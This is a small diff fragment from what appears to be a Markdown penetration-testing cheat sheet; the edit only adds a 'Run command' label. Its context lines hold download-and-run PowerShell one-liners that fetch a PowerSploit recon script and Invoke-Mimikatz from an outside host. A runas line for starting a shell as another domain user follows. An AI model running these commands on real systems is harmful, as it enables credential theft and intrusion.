@@ -59,7 +59,7 @@ iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon
 iex(iwr http://192.168.50.149/Invoke-Mimikatz.ps1)
 
 ```
-
+Run command
 ```cmd
 runas /user:[Domain]\[user] cmd
 ```
